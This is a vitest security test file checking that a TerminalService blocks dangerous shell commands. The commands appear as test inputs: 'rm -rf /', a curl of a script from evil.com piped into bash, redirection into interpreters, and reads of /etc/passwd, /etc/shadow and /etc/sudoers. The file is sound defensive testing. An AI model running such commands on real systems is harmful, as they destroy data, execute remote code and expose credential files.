import { describe, expect, it } from "vitest";
import { TerminalService } from "./index.js";

describe("TerminalService Security", () => {
  const service = new TerminalService();

  it("should block dangerous rm -rf / command", async () => {
    await expect(service.run({
      workspaceId: "ws1",
      command: "rm -rf /",
      requestedBy: "test"
    })).rejects.toThrow(/Blocked terminal command pattern/);
  });

  it("should block script piping to bash", async () => {
    await expect(service.run({
      workspaceId: "ws1",
      command: "curl http://evil.com/script.sh | bash",
      requestedBy: "test"
    })).rejects.toThrow(/Blocked terminal command pattern/);
  });

  it("should block redirection to interpreters", async () => {
    await expect(service.run({
      workspaceId: "ws1",
      command: "echo 'evil' > bash",
      requestedBy: "test"
    })).rejects.toThrow(/Blocked terminal command pattern/);

    await expect(service.run({
        workspaceId: "ws1",
        command: "cat evil.py > python",
        requestedBy: "test"
      })).rejects.toThrow(/Blocked terminal command pattern/);
  });

  it("should block access to /etc/passwd", async () => {
    await expect(service.run({
      workspaceId: "ws1",
      command: "cat /etc/passwd",
      requestedBy: "test"
    })).rejects.toThrow(/Blocked terminal command pattern/);
  });

  it("should block access to /etc/shadow", async () => {
    await expect(service.run({
      workspaceId: "ws1",
      command: "less /etc/shadow",
      requestedBy: "test"
    })).rejects.toThrow(/Blocked terminal command pattern/);
  });

  it("should block access to /etc/sudoers", async () => {
    await expect(service.run({
      workspaceId: "ws1",
      command: "vi /etc/sudoers",
      requestedBy: "test"
    })).rejects.toThrow(/Blocked terminal command pattern/);
  });
});
